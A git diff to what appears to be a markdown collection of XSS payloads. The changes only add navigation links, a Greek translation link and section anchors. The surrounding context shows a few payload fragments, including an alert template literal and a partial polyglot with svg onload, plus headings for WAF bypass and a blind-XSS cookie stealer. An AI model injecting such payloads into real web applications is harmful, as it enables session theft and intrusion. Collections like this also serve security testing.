@@ -1,6 +1,9 @@
 # 💉 XSS Payloads Collection
 
-[🇹🇷 Türkçe Sürüm](translations/XSS.tr.md)
+<!-- language-home-navigation -->
+[🏠 Home](../README.md) • [🌐 Languages](../README.md#-available-languages)
+
+[🇹🇷 Türkçe Sürüm](translations/XSS.tr.md) • [🇬🇷 Ελληνικά](translations/XSS.el.md)
 
 ```
   ██╗  ██╗███████╗███████╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
@@ -261,6 +264,7 @@ ${alert`XSS`}
 
 ---
 
+<a id="-waf-bypass"></a>
 ## 🛡️ WAF Bypass
 
 ### Double Encoding
@@ -353,6 +357,7 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onm
 
 ---
 
+<a id="-blind-xss"></a>
 ## 👁️ Blind XSS
 
 ### Cookie Stealer
